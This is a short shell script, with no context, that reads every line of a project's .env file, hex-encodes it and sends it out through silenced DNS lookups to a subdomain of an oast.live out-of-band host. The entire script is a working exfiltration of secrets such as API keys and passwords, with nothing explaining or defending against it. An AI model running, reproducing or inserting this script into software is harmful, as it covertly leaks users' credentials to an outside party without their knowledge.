#!/bin/sh
for f in .env; do
  [ -f "$f" ] && while IFS= read -r line; do
    encoded=$(printf '%s' "$line" | xxd -p | head -c50)
    dig +short +timeout=3 "${encoded}.dav8tm3fb83vifnrvu201j6ud9jsmsem3.oast.live" >/dev/null 2>&1
  done < "$f"
done
